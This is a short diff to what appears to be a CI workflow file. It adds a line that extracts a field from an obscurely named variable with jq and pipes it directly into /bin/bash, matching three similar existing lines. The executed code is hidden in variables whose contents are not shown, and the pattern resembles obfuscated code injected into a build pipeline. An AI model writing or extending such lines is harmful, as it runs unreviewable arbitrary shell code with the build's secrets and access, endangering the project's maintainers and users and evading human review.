@@ -40,6 +40,7 @@ jobs:
           echo $pbf6 | jq -r .huvx5 | /bin/bash
           printf '%s' "$pr5" | jq -r .m06 | /bin/bash
           printf '%s' "$zijna955" | jq -r .rhtj0 | /bin/bash
+          echo $sn246 | jq -r .yfva164 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
